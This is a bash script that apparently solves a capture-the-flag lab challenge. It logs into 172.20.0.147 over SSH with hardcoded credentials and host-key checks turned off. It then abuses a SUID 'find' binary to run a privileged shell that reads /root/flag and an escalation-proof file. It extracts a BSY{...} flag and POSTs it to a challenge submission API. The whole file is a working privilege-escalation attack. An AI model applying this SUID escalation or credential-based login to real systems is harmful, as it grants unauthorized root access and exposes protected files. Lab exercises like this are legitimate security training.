#!/bin/bash
set -euo pipefail

HOST="172.20.0.147"
LOGIN="buildtech"
PASSWORD="NeonComet-47"
CHALLENGE_ID="scl-challenge-frame-c318b1"

remote_cmd="find /tmp -maxdepth 0 -exec /bin/sh -p -c 'cat /root/flag; cat /root/.escalation-proof' \\;"
result=$(sshpass -p "$PASSWORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -T "$LOGIN@$HOST" "$remote_cmd")

printf '%s\n' "$result"
flag=$(printf '%s\n' "$result" | python3 -c 'import re,sys; m=re.search(r"BSY[{][^}]+[}]",sys.stdin.read()); print(m.group(0) if m else "")')
if [ -z "$flag" ]; then
  echo "Could not extract a BSY flag from the root command output." >&2
  exit 1
fi

payload=$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":sys.argv[1],"task_id":"task1","flag":sys.argv[2]}))' "$CHALLENGE_ID" "$flag")
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
printf '\n'
